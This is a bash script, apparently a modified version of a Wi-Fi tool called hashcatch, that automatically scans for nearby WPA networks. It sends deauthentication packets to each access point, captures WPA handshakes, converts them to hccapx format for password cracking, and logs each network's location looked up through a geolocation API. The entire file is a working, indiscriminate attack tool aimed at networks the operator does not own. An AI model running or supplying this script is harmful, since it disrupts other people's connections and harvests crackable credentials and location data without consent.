#!/bin/bash

trap ctrl_c INT

RED='\033[0;31m'
LBLUE='\033[1;34m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m'
NC='\033[0m'

f_config="/handshakes4/4.conf"
f_db="/handshakes4/db"
d_handshakes="/handshakes4/handshakes"

ctrl_c(){
	echo -en "\033[2K"
	echo -en "\n\r${YELLOW}[*] Keyboard Interrupt${NC}"
	echo -e "\033[K"
	echo -e "\r${LBLUE}[*] Handshakes captured this session: $hs_count${NC}"
	rm -r /tmp/hc_* &> /dev/null
	tput cnorm
	kill $! &> /dev/null
	exit 0
}

banner(){
	echo -e "${RED}"
	echo " __   __  _______  _______  __   __  _______  _______  _______  _______  __   __ ";
	echo "|  | |  ||   _   ||       ||  | |  ||       ||   _   ||       ||       ||  | |  |";
	echo "|  |_|  ||  |_|  ||  _____||  |_|  ||       ||  |_|  ||_     _||       ||  |_|  |";
	echo "|       ||       || |_____ |       ||       ||       |  |   |  |       ||       |";
	echo "|       ||       ||_____  ||       ||      _||       |  |   |  |      _||       |";
	echo "|   _   ||   _   | _____| ||   _   ||     |_ |   _   |  |   |  |     |_ |   _   |";
	echo "|__| |__||__| |__||_______||__| |__||_______||__| |__|  |___|  |_______||__| |__|";
	echo -en "\n${NC}"
}

spin(){
        echo -en "/"
        sleep 0.1
        echo -en "\033[1D"
        echo -en "-"
        sleep 0.1
        echo -en "\033[1D"
        echo -en "\\"
        sleep 0.1
        echo -en "\033[1D"
        echo -en "|"
        sleep 0.1
        echo -en "\033[1D"
}

hc_setup(){
	if [ "$EUID" -ne 0 ]
	then
		echo -e "[-] Requires root permission. Exiting!"
		exit 0
	fi
	banner
	echo "[*] Starting hashcatch setup"

	if [ -s $f_config ] || [ -s $f_db ] || [ `ls $d_handshakes` ]
	then
		echo -e "${RED}[!] WARNING! Continuing with setup will rewrite your existing config file, db file, and your handshakes directory! Take a backup if necessary${NC}"
		read -p "[!] Do you want to proceed? [y/N]: " flag
		flag=${flag:-"n"}
		if [[ ${flag,,} == "n" ]]
		then
			echo "[*] Exiting!"
			exit 0
		fi
	fi

	sudo cp /dev/null $f_config &> /dev/null
	sudo cp /dev/null $f_db &> /dev/null
	mkdir $d_handshakes &> /dev/null

	read -p "[*] Enter your wireless interface: " interface
	echo -e "[*] Trying to set the given interface to monitor mode"
	while [[ `sudo aireplay-ng --test $interface 2>&1` != *"Injection is working"* ]]
	do
		echo -e "${YELLOW}[-] Could not set the given wireless adapter to monitor mode!${NC}"
		read -p "[-] Enter another wireless interface to try again: " interface
	done
	echo -e "${GREEN}[+] The adapter is working in monitor mode!${NC}"
	echo "interface=$interface" >> $f_config

	if [[ `cat /etc/os-release` == *debian* ]]
	then
	        if [[ (`dpkg -s aircrack-ng jq 2>&1` == *"not installed"*) || (! `command -v cap2hccapx`) || (! `command -v wlanhcxinfo`) ]]
		then
			echo -e "${YELLOW}[!] The following packages are missing. Please ensure that you have installed them properly before starting hashcatch${NC}"
			if [[ `dpkg -s aircrack-ng 2>&1` == *"not installed"* ]]
			then
				echo -e "\taircrack-ng"
			elif [[ ! `command -v cap2hccapx 2>&1` ]]
			then
				echo -e "\thashcat-utils"
			elif [[ ! `command -v wlanhcxinfo 2>&1` ]]
			then
				echo -e "\thcxtools"
			elif [[ `dpkg -s jq 2>&1` == *"not installed"* ]]
			then
				echo -e "\tjq"
			fi
		else
			echo -e "${GREEN}[*] All necessary packages are found installed${NC}"
		fi
	elif [[ `cat /etc/os-release` == *arch* ]]
	then
	        if [[ `pacman -Qi aircrack-ng hashcat-utils hcxtools jq 2>&1` == *"not found"* ]]
		then
			echo -e "${YELLOW}[!] The following packages are missing. Please ensure that you have installed them properly before starting hashcatch${NC}"
			if [[ `pacman -Qi aircrack-ng 2>&1` == *"not found"* ]]
			then
				echo -e "\taircrack-ng"
			elif [[ `pacman -Qi hashcat-utils 2>&1` == *"not found"* ]]
			then
				echo -e "\thashcat-utils"
			elif [[ `pacman -Qi hcxtools 2>&1` == *"not found"* ]]
			then
				echo -e "\thcxtools"
			elif [[ `pacman -Qi jq 2>&1` == *"not found"* ]]
			then
				echo -e "\tjq"
			fi
		else
			echo -e "${GREEN}[*] All necessary packages are found installed${NC}"
		fi
	else
		echo -e "${YELLOW}[*] Please ensure that you have installed the following packages before starting hashcatch${NC}"
		echo -e "\taircrack-ng\n\thashcat-utils\n\thcxtools\n\tjq"
	fi

	echo -e "[*] Done"
}

hc_help(){
	banner
	echo -e "Start hashcatch:"
	echo -e "\tsudo ./hashcatch"
	echo -e "Arguments:"
	echo -e "\t./hashcatch --setup - Run setup"
	echo -e "\t./hashcatch --help  - Print this help screen\n"
}

hc_run(){
	interface=`grep -i 'interface' $f_config | awk -F'=' '{print $2}'`
	
	if [ "$EUID" -ne 0 ]
	then
		echo -e "[-] Requires root permission. Exiting!"
		exit 0
	elif [ ! -f $f_config ] || [ ! -f $f_db ] || [ ! -d $d_handshakes ]
	then
		echo -e "[-] Essential file(s) missing. Run with --setup and try again!"
		exit 0
	elif [ ! `grep -i "interface" $f_config | awk -F'=' '{print $2}'` ]
	then
		echo -e "[-] Interface not mentioned in config file. Run with --setup and try again!"
		exit 0
	elif [[ `sudo aireplay-ng --test $interface 2>&1` != *"Injection is working"* ]]
	then
		echo -e "[-] Could not set wireless adapter to monitor mode. Run with --setup and try again!"
		exit 0
	fi

	if [[ `cat /etc/os-release` == *debian* ]]
	then
	        if [[ (`dpkg -s aircrack-ng jq 2>&1` == *"not installed"*)  || (! `command -v cap2hccapx`) || (! `command -v wlanhcxinfo`)]]
		then
			echo "${YELLOW}[!] The following packages are missing. Install them and try again!${NC}"
			exit 0
			if [[ `dpkg -s aircrack-ng 2>&1` == *"not installed"* ]]
			then
				echo -e "\taircrack-ng"
				exit 0
			elif [[ ! `command -v cap2hccapx 2>&1` ]]
			then
				echo -e "\thashcat-utils"
				exit 0
			elif [[ ! `command -v wlanhcxinfo 2>&1` ]]
			then
				echo -e "\thcxtools"
				exit 0
			elif [[ `dpkg -s jq 2>&1` == *"not installed"* ]]
			then
				echo -e "\tjq"
				exit 0
			fi
		fi
	elif [[ `cat /etc/os-release` == *arch* ]]
	then
	        if [[ `pacman -Qi aircrack-ng hashcat-utils hcxtools jq 2>&1` == *"not found"* ]]
		then
			echo "${YELLOW}[!] The following packages are missing. Install them and try again${NC}"
			if [[ `pacman -Qi aircrack-ng 2>&1` == *"not found"* ]]
			then
				echo -e "\taircrack-ng"
				exit 0
			elif [[ `pacman -Qi hashcat-utils 2>&1` == *"not found"* ]]
			then
				echo -e "\thashcat-utils"
				exit 0
			elif [[ `pacman -Qi hcxtools 2>&1` == *"not found"* ]]
			then
				echo -e "\thcxtools"
				exit 0
			elif [[ `pacman -Qi jq 2>&1` == *"not found"* ]]
			then
				echo -e "\tjq"
				exit 0
			fi
		fi
	fi

	tput civis
	
	banner

	rm -r /tmp/hc_* &> /dev/null

	echo -en "\033[3B"

	hs_count=0

	while true
	do
		ap_count=0

		echo -en "\033[3A"
		echo -en "\033[2K"
		echo -en "\rStatus: ${YELLOW}Scanning for WiFi networks${NC}"
		echo -en "\033[2C"
		while [ true ]; do echo -en "${YELLOW}"; spin; echo -en "${NC}"; done &
		timeout --foreground 3 airodump-ng "$interface" -t wpa -w /tmp/hc_out3 --output-format csv &> /dev/null
		echo -en "${NC}"
		kill $! &> /dev/null
		echo -en "\033[1B"
		echo -en "\033[2K"
		echo -en "\033[2B"
		echo -en "\r"

		#echo "[*] Reading stations"
		while read -r line; do bssid=$(echo $line | awk -F ',' '{print $1}'); essid=$(echo $line | awk -F',' '{print $14}'); channel=$(echo $line | awk -F',' '{print $4}'); echo $bssid,$essid,$channel; done < /tmp/hc_out3-01.csv | grep -iE "([0-9A-F]{2}[:-]){5}([0-9A-F]{2}), [-a-zA-Z0-9_ !]+, ([0-9]{1,2})" > /tmp/hc_stations3.tmp

		#echo "[*] Clearing temp files"
		rm /tmp/hc_out3*

		readarray stations < /tmp/hc_stations3.tmp

		mkdir /tmp/hc_captures3 &> /dev/null
		mkdir /tmp/hc_handshakes3 &> /dev/null

		for station in "${stations[@]}"
		do
			bssid=`echo "$station" | awk -F',' '{print $1}' | sed -e 's/^[" "]*//'`
			essid=`echo "$station" | awk -F',' '{print $2}' | sed -e 's/^[" "]*//'`
			channel=`echo "$station" | awk -F',' '{print $3}' | sed -e 's/^[" "]*//'`
			if [[ "`grep -i 'ignore' $f_config | awk -F'=' '{print $2}'`" == *"$essid"* ]] || [[ "`grep "$bssid" $f_db`" ]]
			then
				continue
			fi
			((ap_count++))
			echo -en "\033[2A"
			echo -en "\033[2K"
			echo -en "\rAccess Point: ${YELLOW}$essid${NC}"
			echo -en "\033[2B"
			echo -en "\033[3A"
			echo -en "\033[2K"
			echo -en "\rStatus: ${YELLOW}Deauthenticating clients${NC}"
			echo -en "\033[3B"
			echo -en "\r"
			iwconfig "$interface" channel "$channel"
            
                        # Function to generate a unique filename by appending a number
            generate_unique_filename() {
                local base_name="$1"
                local dir="$2"
                local count=1
                local new_name="$base_name"

                # Check if the file exists and increment the count until a unique name is found
                while [ -e "$dir/$new_name" ]; do
                    new_name="${base_name%.*}-$count.${base_name##*.}"
                    count=$((count + 1))
                done

                echo "$new_name"
            }

            # Start deauthentication attack
            aireplay-ng --deauth 5 -a "$bssid" "$interface" &> /dev/null &
            sleep 1

            # Update status
            echo -en "\033[3A"
            echo -en "\033[2K"
            echo -en "\rStatus: ${YELLOW}Listening for handshake${NC}"

            # Start spinner
            while :; do
                echo -en "${YELLOW}"; spin; echo -en "${NC}"
            done &

            # Update cursor position
            echo -en "\033[2C"

            # Capture handshake
            timeout --foreground 10s airodump-ng -w /tmp/hc_captures3/"$essid" --output-format pcap --bssid "$bssid" --channel "$channel" "$interface" &> /dev/null

            # Reset status
            echo -en "${NC}"
            kill $! &> /dev/null
            echo -en "\033[3B"
            echo -en "\r"

            # Convert to .hccapx
            cap2hccapx "/tmp/hc_captures3/$essid.pcap" "/tmp/hc_handshakes3/$essid.hccapx" &> /dev/null

            # Generate unique filenames for .cap and .hccapx files
            unique_cap=$(generate_unique_filename "$essid.pcap" "$d_handshakes")
            unique_hccapx=$(generate_unique_filename "$essid.hccapx" "$d_handshakes")

            # Move .cap file to destination with unique name
            mv "/tmp/hc_captures3/$essid-01.cap" "$d_handshakes/$unique_cap" &> /dev/null

            # Check if handshake is valid
            hashflag=$(wlanhcxinfo -i "/tmp/hc_handshakes3/$essid.hccapx" 2>&1)
            if [[ $hashflag == *"0 records loaded"* ]]; then
                # Remove invalid .hccapx and move .pcap to destination
                rm "/tmp/hc_handshakes3/$essid.hccapx" "$d_handshakes/$essid.hccapx" &> /dev/null
                mv "/tmp/hc_captures3/$essid-01.pcap" "$d_handshakes/$essid-01.pcap" &> /dev/null
            else
                # Move valid .hccapx to destination with unique name
                mv "/tmp/hc_handshakes3/$essid.hccapx" "$d_handshakes/$unique_hccapx" &> /dev/null
                ((hs_count++))

                # Retrieve and store location data
                loc_data=$(curl -s "https://api.mylnikov.org/geolocation/wifi?v=1.2&bssid=$bssid")
                if [ -n "$loc_data" ]; then
                    loc_lat=$(echo "$loc_data" | jq .data.lat)
                    loc_lon=$(echo "$loc_data" | jq .data.lon)
                    loc_range=$(echo "$loc_data" | jq .data.range)
                    loc_time=$(echo "$loc_data" | jq .data.time)
                    echo "$bssid,$essid,$loc_lat,$loc_lon,$loc_range,$loc_time" >> "$f_db"
                else
                    echo "$bssid,$essid" >> "$f_db"
                fi
            fi

		done

		if [[ $ap_count == 0 ]]
		then
			echo -en "\033[1A"
			echo -en "\033[2K"
			echo -en "\rLast scan: ${YELLOW}No new networks found, scanning again...${NC}"
			echo -en "\033[1B"
			echo -en "\r"
		else
			echo -en "\033[1A"
			echo -en "\033[2K"
			echo -en "\rLast scan: ${YELLOW}`ls /tmp/hc_handshakes3/ | wc -l` new handshakes captured${NC}"
			echo -en "\033[1B"
			echo -en "\r"
		fi
	done
}

if [[ $1 == "--help" ]]
then
	hc_help
elif [[ $1 == "--setup" ]]
then
	hc_setup
elif [[ $1 == "" ]]
then
	hc_run
else
	hc_help
fi